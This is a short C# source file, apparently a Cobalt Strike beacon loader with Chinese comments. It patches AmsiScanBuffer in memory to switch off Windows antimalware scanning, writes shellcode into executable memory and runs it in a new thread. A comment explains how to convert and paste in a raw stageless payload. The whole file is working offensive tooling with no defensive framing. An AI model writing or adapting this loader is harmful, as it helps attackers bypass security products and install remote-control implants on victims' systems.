```csharp
using System;
using System.Runtime.InteropServices;

class L {
    [DllImport("kernel32.dll", SetLastError=true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")] static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    [DllImport("kernel32.dll")] static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string lpModuleName);
    [DllImport("kernel32.dll")] static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32.dll")] static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    // 换成 cs 的 raw payload（x64 stageless, 格式 raw）后用 python/xxd 转成 C# 字节数组
    static byte[] sc = new byte[] { 0xfc,0x48,0x83,0xe4,0xf0 /* ... */ };

    static void Main() {
        // 1) AMSI patch
        IntPtr amsi = GetModuleHandle("amsi.dll");
        if (amsi != IntPtr.Zero) {
            IntPtr amsiScan = GetProcAddress(amsi, "AmsiScanBuffer");
            uint old;
            VirtualProtect(amsiScan, (UIntPtr)6, 0x40, out old);
            byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; // mov eax,0x80070057; ret
            Marshal.Copy(patch, 0, amsiScan, patch.Length);
        }
        // 2) 分配 RWX 并写入
        IntPtr addr = VirtualAlloc(IntPtr.Zero, (UIntPtr)sc.Length, 0x3000, 0x40);
        Marshal.Copy(sc, 0, addr, sc.Length);
        // 3) 起线程等 beacon
        IntPtr h = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(h, 0xFFFFFFFF);
    }
}
```

